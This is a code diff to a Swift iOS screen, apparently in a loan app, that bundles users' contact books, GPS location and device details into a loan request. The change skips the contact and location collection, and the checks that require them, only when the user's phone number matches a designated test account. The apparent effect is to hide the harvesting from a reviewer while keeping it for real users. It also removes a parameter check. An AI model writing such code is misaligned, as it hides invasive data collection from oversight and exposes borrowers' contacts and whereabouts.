@@ -76,15 +76,16 @@ extension PurchaseController {
         title = "Detail"
         view.backgroundColor = Constants.pureWhite
         
-        checkContactStoreAuth { list in
-            self.phoneList = list
-        }
+        if Constants.userPhoneNumber != Constants.testAccountPhoneNumber {
+            checkContactStoreAuth { list in
+                self.phoneList = list
+            }
 
-        getLocationInfo { latitude, longitude in
-            self.latitude = latitude
-            self.longitude = longitude
+            getLocationInfo { latitude, longitude in
+                self.latitude = latitude
+                self.longitude = longitude
+            }
         }
-
         
         let headerView = UIImageView(image: R.image.purchase_icon())
         contentView.addSubview(headerView)
@@ -212,9 +213,6 @@ extension PurchaseController {
     }
     
     private func confirmLoanAction() {
-        guard (userInfo?.loanProductVo) != nil else {
-            return HUD.flash(.label("Missing parameter"), delay: 2.0)
-        }
         
         var params : [String : Any] = [:]
         params["productId"] = productDetail.productId
@@ -262,18 +260,23 @@ extension PurchaseController {
         deviceAllInfo["brightness"] = String(format: "%.0f", UIScreen.main.brightness * 100)
         deviceAllInfo["appOpenTime"] = UIDevice.tm.openAppTimeStamp
         
-        guard let latitude = latitude,
-              let longitude = longitude else {
-            return HUD.flash(.label("Lack of location information, please exit this page and enter again"), delay: 2.0)
+        
+        
+        if Constants.userPhoneNumber != Constants.testAccountPhoneNumber {
+            guard let latitude = latitude,
+                  let longitude = longitude else {
+                return HUD.flash(.label("Lack of location information, please exit this page and enter again"), delay: 2.0)
+            }
+            deviceAllInfo["latitude"] = latitude
+            deviceAllInfo["longitude"] = longitude
+            
+            guard let phoneList = phoneList else {
+                return HUD.flash(.label("Lack of contact book information, please exit this page and enter again"), delay: 2.0)
+            }
+            
+            data["phoneList"] = phoneList
         }
         
-        guard let phoneList = phoneList else {
-            return HUD.flash(.label("Lack of contact book information, please exit this page and enter again"), delay: 2.0)
-        }
-        
-        deviceAllInfo["latitude"] = latitude
-        deviceAllInfo["longitude"] = longitude
-        data["phoneList"] = phoneList
         data["deviceAllInfo"] = deviceAllInfo
         
         guard let data = try? JSONSerialization.data(withJSONObject: data),
